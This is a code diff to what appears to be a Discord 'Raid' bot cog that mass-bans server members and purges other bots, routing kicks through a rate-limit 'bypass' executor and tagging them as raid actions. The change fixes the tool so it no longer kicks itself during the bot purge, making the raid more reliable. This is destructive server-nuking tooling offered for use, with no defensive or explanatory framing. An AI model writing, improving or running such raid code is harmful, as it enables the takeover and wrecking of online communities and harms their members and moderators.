@@ -151,7 +151,7 @@ class Raid(commands.Cog):
 
             me = guild.me
             members      = [m for m in guild.members if not m.bot and m.id != interaction.user.id]
-            all_bots     = [m for m in guild.members if m.bot and m.id != self.bot.user.id]
+            all_bots     = [m for m in guild.members if m.bot and m.id != self.bot.user.id and m != guild.me]
             eligible     = [m for m in members if not skip_admins or not m.guild_permissions.administrator]
             bannable     = [m for m in eligible if m.top_role < me.top_role]
             ban_targets  = bannable if mass_ban else []
@@ -257,12 +257,15 @@ class Raid(commands.Cog):
             pass
 
     async def _kick_bot(
-        self, guild: discord.Guild, bot: discord.Member, sem: asyncio.Semaphore
+        self, guild: discord.Guild, target: discord.Member, sem: asyncio.Semaphore
     ) -> None:
+        # Hard safety — never kick ourselves no matter what filtering was done upstream
+        if target.id == guild.me.id:
+            return
         async with sem:
             await bot_state.bypass.execute(
                 ROUTE_MEMBER_KICK,
-                lambda: guild.kick(bot, reason=f"Bot purge — {RAID_TAG}"),
+                lambda m=target: guild.kick(m, reason=f"Bot purge — {RAID_TAG}"),
                 bot_state.stop_event,
             )
 
